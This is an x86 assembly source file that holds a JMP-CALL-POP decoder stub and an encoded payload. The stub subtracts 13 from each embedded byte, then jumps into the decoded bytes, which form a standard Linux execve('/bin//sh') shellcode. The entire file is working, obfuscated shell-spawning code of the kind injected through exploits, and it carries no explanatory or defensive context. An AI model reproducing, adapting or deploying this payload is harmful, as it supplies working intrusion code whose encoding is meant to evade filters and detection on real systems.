global _start  
  
section .text  
  
_start:
	jmp short call_decoder 	; JMP-CALL-POP

decoder:
	pop esi ; pop shellcode address
	xor ecx, ecx ; null ecx
	mov cl, len ; load length into register

decode:
	sub byte [esi], 0xD ; substract 13
	jmp short loop_shellcode

fck_null:
	xor eax, eax ; junk instruction to avoid null byte

loop_shellcode:
	inc esi ; next byte
	loop decode ; repeat until shellcode ends
	jmp short shellcode ; jump to shellcode after loop ends

call_decoder:  
    call decoder 
    shellcode: 
        db 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b,0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d
	len: equ $-shellcode